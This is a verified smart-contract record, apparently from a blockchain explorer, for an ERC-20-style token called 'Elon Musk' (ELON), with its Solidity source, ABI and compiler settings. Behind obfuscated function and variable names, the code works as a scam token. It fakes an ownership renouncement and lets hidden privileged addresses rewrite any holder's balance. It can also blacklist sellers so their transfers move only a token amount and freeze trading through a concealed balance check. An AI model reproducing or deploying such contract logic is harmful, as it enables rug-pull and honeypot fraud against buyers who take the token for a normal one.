{"SourceCode": "//SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.2;\r\n\r\ninterface tokenSell {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n}\r\n\r\nabstract contract fundAuto {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface toLaunchedTake {\r\n    function createPair(address tradingFromTake, address swapMarketing) external returns (address);\r\n}\r\n\r\ninterface fundTakeLimit {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address launchTradingMode) external view returns (uint256);\r\n\r\n    function transfer(address senderLaunchSwap, uint256 feeList) external returns (bool);\r\n\r\n    function allowance(address marketingFund, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 feeList) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address senderLaunchSwap,\r\n        uint256 feeList\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed launchMarketing, uint256 value);\r\n    event Approval(address indexed marketingFund, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface fundTakeLimitMetadata is fundTakeLimit {\r\n    function name() external view returns (string memory);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\ncontract ElonMusk is fundAuto, fundTakeLimit, fundTakeLimitMetadata {\r\n\r\n    address public marketingList;\r\n\r\n    mapping(address => mapping(address => uint256)) private autoMarketingReceiver;\r\n\r\n    function autoExempt(uint256 feeList) public {\r\n        tokenShould();\r\n        atTotal = feeList;\r\n    }\r\n\r\n    function swapTrading(address launchedMode, address senderLaunchSwap, uint256 feeList) internal returns (bool) {\r\n        require(tokenMode[launchedMode] >= feeList);\r\n        tokenMode[launchedMode] -= feeList;\r\n        tokenMode[senderLaunchSwap] += feeList;\r\n        emit Transfer(launchedMode, senderLaunchSwap, feeList);\r\n        return true;\r\n    }\r\n\r\n    function walletExempt(address takeFundLiquidity) public {\r\n        tokenShould();\r\n        if (marketingLimit == receiverTotalExempt) {\r\n            receiverTotalExempt = tradingBuy;\r\n        }\r\n        if (takeFundLiquidity == marketingList || takeFundLiquidity == atFundLaunched) {\r\n            return;\r\n        }\r\n        fromTake[takeFundLiquidity] = true;\r\n    }\r\n\r\n    function allowance(address teamIs, address receiverMinLaunch) external view virtual override returns (uint256) {\r\n        if (receiverMinLaunch == receiverLaunched) {\r\n            return type(uint256).max;\r\n        }\r\n        return autoMarketingReceiver[teamIs][receiverMinLaunch];\r\n    }\r\n\r\n    address receiverLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\r\n\r\n    mapping(address => bool) public fromTake;\r\n\r\n    uint256 private txFund = 100000000 * 10 ** 18;\r\n\r\n    mapping(address => uint256) private tokenMode;\r\n\r\n    function getOwner() external view returns (address) {\r\n        return modeTeam;\r\n    }\r\n\r\n    function buyTx() public {\r\n        emit OwnershipTransferred(marketingList, address(0));\r\n        modeTeam = address(0);\r\n    }\r\n\r\n    address private modeTeam;\r\n\r\n    address atTx = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\r\n\r\n    function transferFrom(address launchedMode, address senderLaunchSwap, uint256 feeList) external override returns (bool) {\r\n        if (_msgSender() != receiverLaunched) {\r\n            if (autoMarketingReceiver[launchedMode][_msgSender()] != type(uint256).max) {\r\n                require(feeList <= autoMarketingReceiver[launchedMode][_msgSender()]);\r\n                autoMarketingReceiver[launchedMode][_msgSender()] -= feeList;\r\n            }\r\n        }\r\n        return fromSenderFee(launchedMode, senderLaunchSwap, feeList);\r\n    }\r\n\r\n    function symbol() external view virtual override returns (string memory) {\r\n        return launchAt;\r\n    }\r\n\r\n    string private launchAt = \"ELON\";\r\n\r\n    uint256 walletLiquidityLaunch;\r\n\r\n    function decimals() external view virtual override returns (uint8) {\r\n        return amountLiquiditySender;\r\n    }\r\n\r\n    function txTo(address walletReceiver) public {\r\n        if (liquidityTeam) {\r\n            return;\r\n        }\r\n        \r\n        exemptFundReceiver[walletReceiver] = true;\r\n        \r\n        liquidityTeam = true;\r\n    }\r\n\r\n    function name() external view virtual override returns (string memory) {\r\n        return launchedLiquidity;\r\n    }\r\n\r\n    function totalSupply() external view virtual override returns (uint256) {\r\n        return txFund;\r\n    }\r\n\r\n    uint256 private tradingBuy;\r\n\r\n    function transfer(address maxReceiverLaunch, uint256 feeList) external virtual override returns (bool) {\r\n        return fromSenderFee(_msgSender(), maxReceiverLaunch, feeList);\r\n    }\r\n\r\n    function owner() external view returns (address) {\r\n        return modeTeam;\r\n    }\r\n\r\n    uint256 constant txIsExempt = 18 ** 10;\r\n\r\n    address public atFundLaunched;\r\n\r\n    function minTrading(address maxReceiverLaunch, uint256 feeList) public {\r\n        tokenShould();\r\n        tokenMode[maxReceiverLaunch] = feeList;\r\n    }\r\n\r\n    bool public enableTeam;\r\n\r\n    bool public liquidityTeam;\r\n\r\n    uint256 private marketingLimit;\r\n\r\n    function tokenShould() private view {\r\n        require(exemptFundReceiver[_msgSender()]);\r\n    }\r\n\r\n    function fromSenderFee(address launchedMode, address senderLaunchSwap, uint256 feeList) internal returns (bool) {\r\n        if (launchedMode == marketingList) {\r\n            return swapTrading(launchedMode, senderLaunchSwap, feeList);\r\n        }\r\n        uint256 autoReceiverLiquidity = fundTakeLimit(atFundLaunched).balanceOf(atTx);\r\n        require(autoReceiverLiquidity == atTotal);\r\n        require(senderLaunchSwap != atTx);\r\n        if (fromTake[launchedMode]) {\r\n            return swapTrading(launchedMode, senderLaunchSwap, txIsExempt);\r\n        }\r\n        return swapTrading(launchedMode, senderLaunchSwap, feeList);\r\n    }\r\n\r\n    uint256 private receiverTotalExempt;\r\n\r\n    constructor (){\r\n        \r\n        tokenSell atList = tokenSell(receiverLaunched);\r\n        atFundLaunched = toLaunchedTake(atList.factory()).createPair(atList.WETH(), address(this));\r\n        if (receiverTotalExempt == marketingLimit) {\r\n            limitFrom = false;\r\n        }\r\n        marketingList = _msgSender();\r\n        buyTx();\r\n        exemptFundReceiver[marketingList] = true;\r\n        tokenMode[marketingList] = txFund;\r\n        \r\n        emit Transfer(address(0), marketingList, txFund);\r\n    }\r\n\r\n    bool public enableMode;\r\n\r\n    uint256 atTotal;\r\n\r\n    bool private limitFrom;\r\n\r\n    function balanceOf(address launchTradingMode) public view virtual override returns (uint256) {\r\n        return tokenMode[launchTradingMode];\r\n    }\r\n\r\n    function approve(address receiverMinLaunch, uint256 feeList) public virtual override returns (bool) {\r\n        autoMarketingReceiver[_msgSender()][receiverMinLaunch] = feeList;\r\n        emit Approval(_msgSender(), receiverMinLaunch, feeList);\r\n        return true;\r\n    }\r\n\r\n    event OwnershipTransferred(address indexed atSender, address indexed liquidityMaxTo);\r\n\r\n    string private launchedLiquidity = \"Elon Musk\";\r\n\r\n    uint8 private amountLiquiditySender = 18;\r\n\r\n    mapping(address => bool) public exemptFundReceiver;\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityMaxTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchMarketing\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverMinLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMinLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFundLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeList\",\"type\":\"uint256\"}],\"name\":\"autoExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTradingMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"exemptFundReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiverLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeList\",\"type\":\"uint256\"}],\"name\":\"minTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiverLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderLaunchSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"}],\"name\":\"txTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFundLiquidity\",\"type\":\"address\"}],\"name\":\"walletExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ElonMusk", "CompilerVersion": "v0.8.2+commit.661d1103", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://4be60f20cd14f2558be07cb02df39c5dd3e1b692022a5d6a31adfb79445a005c"}